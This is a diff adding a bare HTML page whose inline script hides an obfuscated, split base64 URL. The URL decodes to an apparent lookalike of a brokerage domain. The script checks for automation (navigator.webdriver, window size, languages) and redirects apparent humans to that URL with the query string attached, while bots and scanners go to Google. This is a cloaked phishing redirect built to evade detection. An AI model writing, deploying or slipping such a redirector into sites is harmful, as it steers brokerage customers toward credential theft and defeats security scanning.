@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title></title>
+  <style>
+    body { background: #fff; margin: 0; }
+  </style>
+</head>
+<body>
+  <script>
+    function decode(x) {
+      return decodeURIComponent(escape(atob(x)));
+    }
+
+    function isHuman() {
+      try {
+        return (
+          Array.isArray(navigator.languages) &&
+          navigator.languages.length > 0 &&
+          !navigator.webdriver &&
+          window.outerWidth > 0 &&
+          window.outerHeight > 0
+        );
+      } catch (_) {
+        return false;
+      }
+    }
+
+    setTimeout(() => {
+      const query = location.search;
+      const t1 = "aHR0cHM6Ly9";
+      const t2 = "3d3cuaW50ZXJh";
+      const t3 = "Y3RpdmVicm9rZXJzLmNv";
+      const t4 = "L3J6Tk5pY3R0";
+      const f1 = "aHR0cHM6Ly9";
+      const f2 = "3d3cuZ29vZ2xl";
+      const f3 = "LmNvbQ==";
+
+      const target = decode(t1 + t2 + t3 + t4);
+      const fallback = decode(f1 + f2 + f3);
+
+      location.href = (isHuman() ? target : fallback) + query;
+    }, 500);
+  </script>
+</body>
+</html>
